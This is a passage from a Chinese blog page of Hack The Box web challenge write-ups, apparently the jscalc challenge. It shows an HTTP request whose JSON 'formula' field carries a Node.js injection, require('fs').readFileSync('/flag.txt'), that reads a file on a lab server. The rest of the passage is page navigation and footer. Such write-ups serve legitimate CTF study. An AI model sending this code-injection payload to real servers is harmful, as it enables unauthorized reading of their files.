class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://188.166.175.58:31222</span><br><span class="line">Referer: http://188.166.175.58:31222/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;formula&quot;:&quot;require(&#x27;fs&#x27;).readFileSync(&#x27;/flag.txt&#x27;).toString();&quot;&#125;</span><br></pre></td></tr></table></figure><p></p><p>直接得到 flag</p><div class="tags"><a href="/tags/WEB/" rel="tag"><i class="ic i-tag"></i> WEB</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-12-13 11:29:17" itemprop="dateModified" datetime="2023-12-13T11:29:17+08:00">2023-12-13</time> </span><span id="HTB-WEB-md/" class="item leancloud_visitors" data-flag-title="HTB-WEB" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="c0iq 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="c0iq 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>c0iq <i class="ic i-at"><em>@</em></i>ililiiY</li><li class="link"><strong>本文链接：</strong> <a href="https://lookhui.github.io/HTB-WEB-md/" title="HTB-WEB">https://lookhui.github.io/HTB-WEB-md/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/PWN%E5%88%B7%E9%A2%98-md/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?484990" title="PWN刷题解析"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> PWN</span><h3>PWN刷题解析</h3></a></div><div class="item right"><a href="/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?717756" title="第一届古剑山"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 比赛</span><h3>第一届古剑山</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#lovetok"><span class="toc-number">1.</span> <span class="toc-text">LoveTok</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toxic"><span class="toc-number">2.</span> <span class="toc-text">Toxic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#neonify"><span class="toc-number">3.</span> <span class="toc-text">Neonify</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cop"><span class="toc-number">4.</span> <span class="toc-text">C.O.P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#renderquest"><span class="toc-number">5.</span> <span class="toc-text">RenderQuest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apacheblaze"><span class="toc-number">6.</span> <span class="toc-text">ApacheBlaze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxyasaservice"><span class="toc-number">7.</span> <span class="toc-text">ProxyAsAService</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jscalc"><span class="toc-number">8.</span> <span class="toc-text">jscalc</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/HTB-WEB-md/" rel="bookmark" title="HTB-WEB">HTB-WEB</a></li><li><a href="/HTB-hunting-md/" rel="bookmark" title="HTB-hunting">HTB-hunting</a></li><li><a href="/HTB-racecar-md/" rel="bookmark" title="HTB-racecar">HTB-racecar</a></li><li><a href="/HTB-You-know-0xDiablos-md/" rel="bookmark" title="HTB-You_know_0xDiablos">HTB-You_know_0xDiablos</a></li><li><a href="/HTB-Sick-ROP/" rel="bookmark" title="HTB-Sick_ROP">HTB-Sick_ROP</a></li><li><a href="/HTB-CozyHosting/" rel="bookmark" title="HTB-CozyHosting">HTB-CozyHosting</a></li><li><a href="/HTB-Sau/" rel="bookmark" title="HTB-Sau">HTB-Sau</a></li><li><a href="/HTB-Keeper/" rel="bookmark" title="HTB-Keeper">HTB-Keeper</a></li><li><a href="/HTB-Analytics/" rel="bookmark" title="HTB-Analytics">HTB-Analytics</a></li><li><a href="/HTB-Codify/" rel="bookmark" title="HTB-Codify">HTB-Codify</a></li><li><a href="/HTB-Devvortex/" rel="bookmark" title="HTB-Devvortex">HTB-Devvortex</a></li><li><a href="/HTB-Zipping/" rel="bookmark" title="HTB-Zipping">HTB-Zipping</a></li><li><a href="/HTB-Saturn/" rel="bookmark" title="HTB-Saturn">HTB-Saturn</a></li><li><a href="/HTB-TwoDots-Horror/" rel="bookmark" title="HTB-TwoDots_Horror">HTB-TwoDots_Horror</a></li><li><a href="/HTB-Restauran/" rel="bookmark" title="HTB-Restauran">HTB-Restauran</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="c0iq" data-src="/images/avatar.jpg"><p class="name" itemprop="name">c0iq</p><div class="description" itemprop="description">坚持与努力</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">27</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">9</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvb2todWk=" title="https:&#x2F;&#x2F;github.com&#x2F;lookhui"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a></li></div></div></div><ul id="quick"><li class="prev pjax"><a href="/PWN%E5%88%B7%E9%A2%98-md/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/%E5%8F%A4%E5%89%91%E5%B1%B1wp-md/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-CozyHosting/" title="HTB-CozyHosting">HTB-CozyHosting</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF%E5%88%B7%E9%A2%98/" title="分类于 CTF刷题">CTF刷题</a></div><span><a href="/MOBILE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="MOBILE刷题记录">MOBILE刷题记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Keeper/" title="HTB-Keeper">HTB-Keeper</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Saturn/" title="HTB-Saturn">HTB-Saturn</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a></div><span><a href="/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="帕鲁杯">帕鲁杯</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/%E8%B0%88%E8%B0%88%E6%88%91%E5%AF%B9%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B8%8E%E8%AF%84%E4%BC%B0%E8%B5%9B%E9%A1%B9%E7%9A%84%E7%9C%8B%E6%B3%95/" title="2024开始的打击">2024开始的打击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%AF%94%E8%B5%9B/" title="分类于 比赛">比赛</a></div><span><a href="/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/" title="第七届强网杯wp">第七届强网杯wp</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-hunting-md/" title="HTB-hunting">HTB-hunting</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Zipping/" title="HTB-Zipping">HTB-Zipping</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Devvortex/" title="HTB-Devvortex">HTB-Devvortex</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">c0iq @ look-hui</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">240k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:39</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"HTB-WEB-md/",favicon:{show:"looklook",hide:"illi"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->